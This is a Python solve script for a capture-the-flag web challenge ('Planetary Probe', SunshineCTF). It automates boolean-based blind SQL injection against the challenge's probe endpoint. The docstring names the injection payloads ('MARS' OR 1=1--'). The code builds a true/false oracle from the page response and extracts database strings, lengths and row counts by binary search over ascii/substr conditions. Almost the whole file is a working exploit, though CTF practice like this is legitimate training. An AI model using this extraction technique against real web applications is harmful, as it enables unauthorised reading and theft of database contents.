#!/usr/bin/env python
"""Planetary Probe (SunshineCTF web 498) -- the console answers exactly one bit.

GET /probe?planet=<x> renders either `readout--carrier` ("Signal detected") or
`readout--null` ("No signal"). The value is interpolated into a SQL string literal:
  MARS' OR 1=1--        -> carrier   (injection works, -- comments accepted)
  MARS' OR 1=1#         -> null      (# not a comment -> not MySQL)
so the whole database has to be read back one bit at a time.

Oracle: `MARS' AND (<cond>)-- ` is carrier iff <cond> is true *and* MARS exists, which the
calibration calls below prove. Everything else is built from that: a per-character binary
search, so one string costs ~7 requests per character instead of 95.
"""
import json
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = "https://planetary.web.2026.sunshinectf.games"
CTX = ssl.create_default_context()
CALL = 0


def raw(payload):
    """Return True (carrier), False (null) or 'ERR'."""
    global CALL
    url = BASE + "/probe?" + urllib.parse.urlencode({"planet": payload})
    for attempt in range(4):
        CALL += 1
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 probe"})
        try:
            with urllib.request.urlopen(req, timeout=30, context=CTX) as r:
                body = r.read().decode("latin-1")
        except urllib.error.HTTPError as e:
            body = e.read().decode("latin-1")
        except Exception as e:
            sys.stderr.write("  [retry %s]\n" % e)
            time.sleep(1.0)
            continue
        if "readout--carrier" in body:
            return True
        if "readout--null" in body:
            return False
        return "ERR"
    return "ERR"


def cond(expr, anchor="MARS"):
    """Does SQL expression <expr> evaluate true?"""
    r = raw("%s' AND (%s)-- " % (anchor, expr))
    if r == "ERR":
        raise RuntimeError("non-boolean response to %r" % expr)
    return r


def calibrate():
    print("[*] AND-oracle calibration")
    for expr, want in [("1=1", True), ("1=2", False),
                       ("(SELECT COUNT(*) FROM planets)>0", None)]:
        try:
            got = cond(expr)
        except Exception as e:
            got = "EXC %s" % e
        print("    %-42s -> %s" % (expr, got))


def binary_string(expr, maxlen=200, lo=31, hi=127):
    """Read one text value out of SQL expression <expr>, one character at a time."""
    print("[*] length of %s" % expr)
    if cond("length(%s)>=%d" % (expr, maxlen)):
        print("[-] length >= %d, giving up" % maxlen)
        return None
    lo, hi = 0, maxlen - 1
    while lo < hi:
        mid = (lo + hi) // 2
        if cond("length(%s)>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    n = lo
    print("[*   ] len=%d" % n)
    out = []
    for pos in range(1, n + 1):
        lo, hi = 31, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if cond("ascii(substr((%s),%d,1))>%d" % (expr, pos, mid)):
                lo = mid + 1
            else:
                hi = mid
        ch = chr(lo) if 31 <= lo <= 127 else "?"
        out.append(ch)
        print("    %3d/%3d %r  %s" % (pos, n, "".join(out), CALL))
    return "".join(out)


def rows(expr_count, expr_at):
    """Enumerate a multi-row column: expr_count = rows, expr_at(i) = i-th value."""
    total = num(expr_count)
    print("[*] %d rows" % total)
    out = []
    for i in range(total):
        out.append(binary_string(expr_at(i)))
    return out


def num(expr):
    lo, hi = 0, 1 << 24
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if cond("(%s)>=%d" % (expr, mid)):
            lo = mid
        else:
            hi = mid - 1
    return lo


if __name__ == "__main__":
    calibrate()
